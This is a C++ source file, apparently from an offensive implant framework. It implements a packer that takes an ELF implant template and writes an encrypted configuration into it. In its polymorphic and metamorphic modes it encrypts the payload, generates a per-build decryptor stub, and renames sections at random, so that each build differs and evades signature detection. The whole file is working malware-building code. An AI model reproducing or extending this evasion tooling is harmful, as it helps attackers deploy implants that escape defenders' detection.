#include "ImplantPacker.hpp"

#include "DecryptorCodegen.hpp"
#include "ElfPacker.hpp"

#include <Metamorphic/BootParams.hpp>
#include <Metamorphic/ConfigEnvelope.hpp>
#include <Metamorphic/TransformEngine.hpp>
#include <Types.hpp>

#include <algorithm>
#include <cstring>
#include <vector>

namespace {

std::string random_section_name() {
    const auto nonce = generate_nonce();
    return std::format(".mx_{:08x}", nonce);
}

std::vector<uint8_t> random_password() {
    std::vector<uint8_t> password(metamorphic::kConfigPasswordSize);
    for (auto& b : password) {
        b = static_cast<uint8_t>(generate_nonce() & 0xFF);
    }
    if (std::all_of(password.begin(), password.end(), [](uint8_t b) { return b == 0; })) {
        password[0] = 0xA5;
    }
    return password;
}

bool copy_template(
    const std::filesystem::path& template_path,
    const std::filesystem::path& output_path,
    std::string& error) {
    if (!std::filesystem::exists(template_path)) {
        error = "implant template not found";
        return false;
    }

    std::error_code ec;
    std::filesystem::copy_file(template_path, output_path, std::filesystem::copy_options::overwrite_existing, ec);
    if (ec) {
        error = "failed to copy template";
        return false;
    }

    return true;
}

bool write_plaintext_config(ELFIO::section* config_section, const ImplantConfig& implant_config) {
    if (!config_section || config_section->get_size() < sizeof(ImplantConfig)) {
        return false;
    }

    const auto offset = config_section->get_size() - sizeof(ImplantConfig);
    std::memcpy(
        const_cast<char*>(config_section->get_data()) + offset,
        &implant_config,
        sizeof(ImplantConfig));
    return true;
}

struct EncryptedConfigBlob {
    std::vector<uint8_t> bytes;
    metamorphic::TransformProgram program;
    std::vector<uint8_t> bytecode;
};

std::optional<EncryptedConfigBlob> build_encrypted_config(
    const ImplantConfig& implant_config,
    const char* config_section_name,
    const char* payload_section_name) {
    EncryptedConfigBlob result;
    result.program = metamorphic::TransformEngine::generate();
    result.bytecode = metamorphic::TransformEngine::serialize_bytecode(result.program);

    metamorphic::ConfigEnvelope envelope{};
    init_envelope_strings(envelope, config_section_name, payload_section_name);
    envelope.implant = implant_config;

    std::vector<uint8_t> envelope_bytes(sizeof(envelope));
    std::memcpy(envelope_bytes.data(), &envelope, sizeof(envelope));
    metamorphic::TransformEngine::encrypt(envelope_bytes, result.program);

    const auto password = random_password();
    result.bytes.reserve(metamorphic::kConfigPasswordSize + envelope_bytes.size());
    result.bytes.insert(result.bytes.end(), password.begin(), password.end());
    result.bytes.insert(result.bytes.end(), envelope_bytes.begin(), envelope_bytes.end());
    return result;
}

} // namespace

ImplantPacker::PackResult ImplantPacker::pack(
    const metamorphic::PackMode mode,
    const std::filesystem::path& template_path,
    const std::filesystem::path& output_path,
    const ImplantConfig& implant_config) {
    PackResult result;
    result.output_path = output_path.string();

    if (!copy_template(template_path, output_path, result.error)) {
        return result;
    }

    ElfPacker packer;
    if (!packer.load(output_path.string())) {
        result.error = "failed to load ELF";
        return result;
    }

    auto* config_section = packer.find_section(metamorphic::kConfigSectionTemplate);
    auto* payload_section = packer.find_section(metamorphic::kPayloadSectionTemplate);
    auto* stub_section = packer.find_section(metamorphic::kStubSectionName);

    if (!config_section || !payload_section || !stub_section) {
        result.error = "required sections missing (.mx_config, .mx_text, .mx_stub)";
        return result;
    }

    const auto entry_offset = packer.find_symbol_offset("mx_main", metamorphic::kPayloadSectionTemplate);
    if (!entry_offset) {
        result.error = "mx_main symbol not found in .mx_text";
        return result;
    }

    if (mode == metamorphic::PackMode::None) {
        if (!write_plaintext_config(config_section, implant_config)) {
            result.error = "failed to write plaintext config";
            return result;
        }

        if (!packer.save(output_path.string())) {
            result.error = "failed to save implant";
            return result;
        }

        result.success = true;
        return result;
    }

    const bool rename_config = mode == metamorphic::PackMode::BytecodePolymorphic
        || mode == metamorphic::PackMode::FullMetamorphic;
    const bool rename_payload = mode == metamorphic::PackMode::FullMetamorphic;
    const bool encrypt_payload = mode == metamorphic::PackMode::FullMetamorphic;

    const auto cfg_name = rename_config ? random_section_name() : std::string(metamorphic::kConfigSectionTemplate);
    const auto txt_name = rename_payload ? random_section_name() : std::string(metamorphic::kPayloadSectionTemplate);

    const auto encrypted_config = build_encrypted_config(implant_config, cfg_name.c_str(), txt_name.c_str());
    if (!encrypted_config) {
        result.error = "failed to build encrypted config";
        return result;
    }

    if (config_section->get_size() < encrypted_config->bytes.size()) {
        result.error = "config section too small";
        return result;
    }

    if (!packer.write_section_data(config_section, encrypted_config->bytes)) {
        result.error = "failed to write config section";
        return result;
    }

    std::vector<uint8_t> decryptor;
    if (encrypt_payload) {
        std::string codegen_error;
        const auto nonce = static_cast<unsigned int>(generate_nonce());
        if (!DecryptorCodegen::generate_decryptor(encrypted_config->program, nonce, decryptor, codegen_error)) {
            result.error = codegen_error;
            return result;
        }

        std::vector<uint8_t> payload_bytes(
            payload_section->get_data(),
            payload_section->get_data() + payload_section->get_size());
        metamorphic::TransformEngine::encrypt(payload_bytes, encrypted_config->program);

        if (!packer.write_section_data(payload_section, payload_bytes)) {
            result.error = "failed to write payload section";
            return result;
        }
    }

    metamorphic::BootParams boot{};
    boot.magic = metamorphic::kBootMagic;
    boot.pack_mode = static_cast<uint32_t>(mode);
    boot.config_file_offset = config_section->get_offset();
    boot.config_file_size = static_cast<uint32_t>(encrypted_config->bytes.size());
    boot.bytecode_size = static_cast<uint32_t>(encrypted_config->bytecode.size());
    boot.decryptor_size = static_cast<uint32_t>(decryptor.size());
    boot.payload_file_offset = payload_section->get_offset();
    boot.payload_file_size = static_cast<uint32_t>(payload_section->get_size());
    boot.payload_entry_offset = static_cast<uint32_t>(*entry_offset);

    std::vector<uint8_t> stub_data(stub_section->get_size(), 0);
    std::memcpy(stub_data.data(), &boot, sizeof(boot));
    std::memcpy(
        stub_data.data() + sizeof(boot),
        encrypted_config->bytecode.data(),
        encrypted_config->bytecode.size());
    if (!decryptor.empty()) {
        std::memcpy(
            stub_data.data() + sizeof(boot) + encrypted_config->bytecode.size(),
            decryptor.data(),
            decryptor.size());
    }

    if (!packer.write_section_data(stub_section, stub_data)) {
        result.error = "failed to write stub section";
        return result;
    }

    if (rename_config && !packer.rename_section(config_section, cfg_name)) {
        result.error = "failed to rename config section";
        return result;
    }

    if (rename_payload && !packer.rename_section(payload_section, txt_name)) {
        result.error = "failed to rename payload section";
        return result;
    }

    if (!packer.save(output_path.string())) {
        result.error = "failed to save packed ELF";
        return result;
    }

    result.success = true;
    return result;
}
